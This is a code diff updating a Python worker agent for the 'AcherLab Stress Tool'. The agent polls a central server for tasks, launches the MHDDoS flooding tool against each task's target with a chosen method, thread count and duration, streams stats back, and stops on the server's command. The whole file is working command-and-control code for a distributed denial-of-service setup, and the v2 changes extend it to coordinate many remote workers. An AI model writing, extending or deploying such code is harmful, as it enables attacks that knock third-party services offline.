@@ -1,20 +1,22 @@
 #!/usr/bin/env python3
 """
-AcherLab Stress Tool - Worker Agent
-Chay tren VPS, nhan lenh tu Server (Railway), chay MHDDoS, gui stats ve.
+AcherLab Stress Tool - Worker Agent v2
+Multi-worker task queue model.
 """
 
-import os, sys, json, time, threading, subprocess, re, requests
+import os, sys, json, time, threading, subprocess, re, requests, platform
 from datetime import datetime
 
 SERVER_URL = os.environ.get("SERVER_URL", "http://localhost:5000")
 TOKEN = os.environ.get("WORKER_TOKEN", "")
+WORKER_ID = os.environ.get("WORKER_ID", platform.node() or "worker-unknown")
 POLL_INTERVAL = int(os.environ.get("POLL_INTERVAL", "2"))
 MHDDOS_DIR = os.environ.get("MHDDOS_DIR", os.path.join(os.path.dirname(__file__), "..", "MHDDoS"))
 
 attack_process = None
 attack_start_time = None
-stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": False, "uptime": "00:00:00", "cpu_info": None}
+current_task_id = None
+stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": False, "uptime": "00:00:00"}
 logs = []
 prev_idle = 0
 prev_total = 0
@@ -76,8 +78,6 @@ def parse_mhd_output(line):
     if m:
         stats["requests"] = int(m.group(1).replace(",", ""))
         stats["running"] = True
-    if re.search(r"Error|error|fail|Traceback|Exception", text):
-        logs.append(f"[!] {text}")
 
 def monitor_mhd_output(proc):
     global stats
@@ -87,23 +87,23 @@ def monitor_mhd_output(proc):
     proc.wait()
     stats["running"] = False
 
-def run_attack(cmd):
-    global attack_process, attack_start_time, stats, logs
+def run_attack(task):
+    global attack_process, attack_start_time, stats, logs, current_task_id, prev_req, prev_req_time
     if attack_process and attack_process.poll() is None:
         return {"error": "Already running"}
-    target = cmd.get("target", "")
-    method = cmd.get("method", "GET")
-    threads = str(cmd.get("threads", 100))
-    duration = str(cmd.get("duration", 60))
-    proxy_type = str(cmd.get("proxy_type", 0))
-    rpc = str(cmd.get("rpc", 10))
+    target = task.get("target", "")
+    method = task.get("method", "GET")
+    threads = str(task.get("threads", 100))
+    duration = str(task.get("duration", 60))
+    proxy_type = str(task.get("proxy_type", 0))
+    rpc = str(task.get("rpc", 10))
 
     logs = []
-    stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": True, "uptime": "00:00:00", "cpu_info": None}
-    global prev_req, prev_req_time
+    stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": True, "uptime": "00:00:00"}
     prev_req = 0
     prev_req_time = time.time()
     attack_start_time = prev_req_time
+    current_task_id = task.get("id")
 
     start_py = os.path.join(MHDDOS_DIR, "start.py")
     if not os.path.exists(start_py):
@@ -138,40 +138,38 @@ def run_attack(cmd):
         return {"error": str(e)}
 
 def stop_attack():
-    global attack_process, stats
+    global attack_process, stats, current_task_id
     if attack_process and attack_process.poll() is None:
         attack_process.terminate()
         try: attack_process.wait(timeout=5)
         except: attack_process.kill()
-        stats["running"] = False
-        logs.append("[STOP] Attack stopped by server command")
-        return {"message": "Stopped"}
-    return {"message": "No attack running"}
+    stats["running"] = False
+    stats["rate"] = 0
+    logs.append("[STOP] Attack stopped")
+    current_task_id = None
+    return {"message": "Stopped"}
 
 def send_headers():
     return {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
 
 def worker_loop():
-    global stats, logs, prev_req, prev_req_time
+    global stats, logs, prev_req, prev_req_time, current_task_id
     cpu_info = get_cpu_info()
-    print(f"[WORKER] Connected to server: {SERVER_URL}")
+    print(f"[WORKER] ID: {WORKER_ID}")
+    print(f"[WORKER] Server: {SERVER_URL}")
     print(f"[WORKER] CPU: {cpu_info['model']} ({cpu_info['cores']}c/{cpu_info['threads']}t)")
-    print(f"[WORKER] MHDDoS: {MHDDOS_DIR}")
 
     while True:
         try:
-            r = requests.get(f"{SERVER_URL}/api/worker/command", headers=send_headers(), timeout=10)
+            r = requests.get(f"{SERVER_URL}/api/worker/ping?worker_id={WORKER_ID}", headers=send_headers(), timeout=10)
             if r.status_code == 200:
                 data = r.json()
-                cmd = data.get("command")
-                if cmd:
-                    action = cmd.get("action")
-                    if action == "start":
-                        result = run_attack(cmd)
-                        print(f"[CMD] start -> {result}")
-                    elif action == "stop":
-                        result = stop_attack()
-                        print(f"[CMD] stop -> {result}")
+                task = data.get("task")
+                if task and current_task_id is None:
+                    print(f"[TASK] Received task #{task['id']}: {task['method']} -> {task['target']}")
+                    run_attack(task)
+                elif task and current_task_id is not None:
+                    pass
 
             uptime = "00:00:00"
             if attack_start_time:
@@ -180,7 +178,6 @@ def worker_loop():
             stats["uptime"] = uptime
             stats["cpu"] = get_cpu_pct()
             stats["memory"] = get_mem_pct()
-            stats["cpu_info"] = cpu_info
 
             now = time.time()
             if prev_req_time and stats["running"]:
@@ -195,14 +192,21 @@ def worker_loop():
 
             payload = {
                 "version": "1.0",
+                "worker_id": WORKER_ID,
                 "cpu_info": cpu_info,
                 "stats": dict(stats),
-                "logs": logs[-50:] if logs else [],
+                "logs": logs[-10:] if logs else [],
+                "current_task": current_task_id,
             }
-            requests.post(f"{SERVER_URL}/api/worker/stats", json=payload, headers=send_headers(), timeout=10)
+            resp = requests.post(f"{SERVER_URL}/api/worker/stats?worker_id={WORKER_ID}", json=payload, headers=send_headers(), timeout=10)
+            if resp.status_code == 200:
+                result = resp.json()
+                if result.get("stop"):
+                    print(f"[CMD] Server requested stop")
+                    stop_attack()
 
         except requests.ConnectionError:
-            print(f"[WORKER] Cannot reach server. Retrying...")
+            pass
         except Exception as e:
             print(f"[WORKER] Error: {e}")
 
@@ -210,9 +214,7 @@ def worker_loop():
 
 if __name__ == "__main__":
     if not TOKEN:
-        print("[ERROR] WORKER_TOKEN environment variable required")
+        print("[ERROR] WORKER_TOKEN required")
         sys.exit(1)
-    if not SERVER_URL or SERVER_URL == "http://localhost:5000":
-        print("[WARN] SERVER_URL not set, using default. Set SERVER_URL env var.")
-    print(f"AcherLab Worker Agent starting...")
+    print(f"AcherLab Worker Agent v2 starting...")
     worker_loop()
